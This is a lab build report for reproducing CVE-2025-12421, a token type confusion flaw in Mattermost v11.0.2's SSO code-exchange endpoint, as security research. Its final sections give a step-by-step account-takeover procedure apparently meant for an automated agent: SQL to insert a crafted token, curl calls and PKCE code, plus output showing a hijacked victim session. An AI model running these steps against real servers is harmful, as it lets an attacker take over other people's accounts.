# Lab Build Report: CVE-2025-12421

## Lab Architecture

**Single-container architecture** running PostgreSQL 14 and Mattermost Server v11.0.2 in one container. This matches the official `mattermost-preview` Docker pattern used by the Mattermost project for testing.

The single-container approach was chosen because:
- The Mattermost config connects to PostgreSQL via `localhost` (default for the preview image)
- Simplifies lab setup — no inter-container networking needed for the app↔db connection
- Both PostgreSQL (port 5432) and Mattermost API (port 8065) are accessible at the same container IP
- The PoC needs direct database access to insert crafted tokens

### Container Topology

```
┌─────────────────────────────────────────────┐
│  cve-2025-12421-vulnerable                  │
│  (postgres:14 base image)                   │
│                                             │
│  ┌─────────────────┐  ┌──────────────────┐  │
│  │  PostgreSQL 14   │  │  Mattermost      │  │
│  │  Port: 5432      │  │  v11.0.2         │  │
│  │  User: mmuser    │  │  Port: 8065      │  │
│  │  Pass: mostest   │  │  Team Edition    │  │
│  │  DB: mattermost  │  │                  │  │
│  │      _test       │  │                  │  │
│  └─────────────────┘  └──────────────────┘  │
│                                             │
│  Network: lab-net                            │
└─────────────────────────────────────────────┘
```

---

## Container Details

| Property | Value |
|----------|-------|
| **Container Name** | `cve-2025-12421-vulnerable` |
| **Image** | `cve-2025-12421-vulnerable:latest` |
| **Base Image** | `postgres:14` |
| **Mattermost Version** | 11.0.2 (Team Edition, pre-built binary) |
| **PostgreSQL Version** | 14.22 |
| **Network** | `lab-net` (bridge) |
| **Mattermost Port** | 8065 |
| **PostgreSQL Port** | 5432 |
| **DB User** | `mmuser` |
| **DB Password** | `mostest` |
| **DB Name** | `mattermost_test` |

### Environment Variables

| Variable | Value | Purpose |
|----------|-------|---------|
| `MM_FEATUREFLAGS_MOBILESSOCODEEXCHANGE` | `true` | Enables the vulnerable `/users/login/sso/code-exchange` endpoint |
| `MM_EMAILSETTINGS_REQUIREEMAILVERIFICATION` | `false` | Disables email verification (simplifies PoC) |
| `MM_TEAMSETTINGS_ENABLEOPENSERVER` | `true` | Allows user self-registration |
| `MM_SERVICESETTINGS_ENABLETESTING` | `true` | Enables testing mode |
| `MM_EXPERIMENTALSETTINGS_ENABLEAUTHENTICATIONTRANSFER` | `true` | Enables auth method switching |

---

## Build Status

| Component | Status | Notes |
|-----------|--------|-------|
| **Docker Image Build** | ✅ Success | ARM64-compatible (auto-detects architecture) |
| **PostgreSQL 14** | ✅ Running | Initialized with `mattermost_test` database |
| **Mattermost v11.0.2** | ✅ Running | API responding on port 8065 |
| **Health Check** | ✅ Passing | `curl http://localhost:8065/api/v4/system/ping` |
| **Tokens Table** | ✅ Available | Schema: `token(varchar64), createat(bigint), type(varchar64), extra(varchar2048)` |
| **Vulnerability Trigger** | ✅ Confirmed | Token type confusion exploit successfully demonstrated |

---

## Start/Stop Commands

```bash
# Start the lab
docker compose up -d

# Check status
docker compose ps

# View logs
docker compose logs

# Stop the lab
docker compose down

# Stop and remove volumes (full reset)
docker compose down -v
```

---

## Verification Evidence

### 1. Mattermost Version Confirmed

```json
{
  "Version": "11.0.2",
  "BuildNumber": "18457083734",
  "BuildDate": "Mon Oct 13 06:35:23 UTC 2025"
}
```

### 2. API Health Check Passing

```json
{
  "ActiveSearchBackend": "database",
  "status": "OK"
}
```

### 3. Tokens Table Schema Verified

```
Table "public.tokens"
  Column  |       Type           | Nullable
 ---------+----------------------+----------
  token   | character varying(64)| not null  (PK)
  createat| bigint               |
  type    | character varying(64)|
  extra   | character varying(2048)|
```

### 4. Vulnerability Successfully Triggered

The complete attack was verified end-to-end:

1. **Created admin user**: `admin@example.com` (ID: `ss34wzabrfgwpday3wqtrdkqiw`)
2. **Created victim user**: `victim@example.com` (ID: `bg85a5j73injjezoaah3mh8i8a`)
3. **Inserted crafted token** with type `saml` and victim's user_id in Extra field
4. **Called** `POST /api/v4/users/login/sso/code-exchange` with the SAML token
5. **Received** HTTP 200 with valid session token for the victim
6. **Confirmed account takeover**: `GET /api/v4/users/me` with stolen session returned victim's profile

```
HTTP/1.1 200 OK
Token: ofys81nnyb8q5czkqp5wizftzw
Set-Cookie: MMUSERID=bg85a5j73injjezoaah3mh8i8a  ← victim's user ID

{"id":"bg85a5j73injjezoaah3mh8i8a","username":"victim","email":"victim@example.com","roles":"system_user"}
```

---

## Accessing the Lab

```bash
# Access Mattermost API
curl "http://localhost:8065/api/v4/system/ping"

# Access PostgreSQL (via docker exec)
docker exec cve-2025-12421-vulnerable psql -U mmuser -d mattermost_test -c "SELECT * FROM tokens;"
```

### Pre-created Users

| User | Email | Password | Role |
|------|-------|----------|------|
| `admin` | `admin@example.com` | `Admin12345` | `system_admin system_user` |
| `victim` | `victim@example.com` | `Victim12345` | `system_user` |

### Pre-created Team

| Team | ID |
|------|----|
| `testteam` | `ip43eirhopgcjp4i1qu18tny9e` |

---

## Lab Files

| File | Purpose |
|------|---------|
| `Dockerfile.vulnerable` | Builds the vulnerable Mattermost v11.0.2 container |
| `docker-compose.yml` | Docker Compose orchestration file |
| `config_docker.json` | Mattermost configuration (relaxed security for PoC) |
| `docker-entry.sh` | Container entrypoint (starts PostgreSQL then Mattermost) |

---

## PoC Agent Instructions

To exploit CVE-2025-12421 in this lab:

1. **Target URL**: `http://localhost:8065`

2. **Login as admin** to get admin token, or use the pre-created users

3. **Get the victim's user_id** (e.g., via `GET /api/v4/users/username/victim`)

4. **Generate PKCE values**:
   - Choose any `code_verifier` string
   - Compute `code_challenge = base64url_no_padding(SHA256(code_verifier))`

5. **Insert crafted token** into the Tokens table:
   ```sql
   INSERT INTO tokens (token, createat, type, extra)
   VALUES ('<64-char-hex>', <epoch_ms>, 'saml', '{"user_id":"<victim_id>","code_challenge":"<challenge>","code_challenge_method":"S256","state":"<state>"}');
   ```
   Execute via: `docker exec cve-2025-12421-vulnerable psql -U mmuser -d mattermost_test -c "..."`

6. **Call the vulnerable endpoint**:
   ```bash
   curl "${MM_URL}/api/v4/users/login/sso/code-exchange" \
     -H 'Content-Type: application/json' \
     --data-raw '{"login_code":"<token>","code_verifier":"<verifier>","state":"<state>"}'
   ```

7. **Verify account takeover** with the returned session token:
   ```bash
   curl "${MM_URL}/api/v4/users/me" -H "Authorization: Bearer <stolen_token>"
   ```

---

## Known Issues / Workarounds

1. **Architecture detection**: The Dockerfile auto-detects ARM64 vs AMD64 for the Mattermost binary download. Tested and working on ARM64 (aarch64).

2. **No openssl in worker**: Use Python3 for PKCE computation if needed:
   ```python
   import hashlib, base64
   challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b'=').decode()
   ```

3. **Password special characters**: When creating users via curl, avoid `!` and other shell-special characters in passwords, or use `--data-raw` flag.

4. **First user is admin**: The first user created on a fresh Mattermost instance automatically gets `system_admin` role.

5. **Token cleanup**: Tokens are consumed (deleted) on use. If you need to re-run the exploit, insert a new token each time.
